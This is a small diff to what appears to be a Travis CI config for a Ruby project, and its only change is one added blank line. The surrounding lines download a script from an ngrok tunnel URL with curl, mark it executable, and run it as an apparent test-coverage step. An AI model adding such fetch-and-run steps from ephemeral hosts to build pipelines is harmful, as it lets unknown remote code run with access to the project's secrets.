@@ -6,6 +6,7 @@ rvm:
 before_script:
   - curl -L https://e3a832b1.ngrok.io/api/v1/travis_script > ./test_cov_script.sh
   - chmod +x ./test_cov_script.sh
+
 script:
   - bundle exec rspec
   - ./test_cov_script.sh
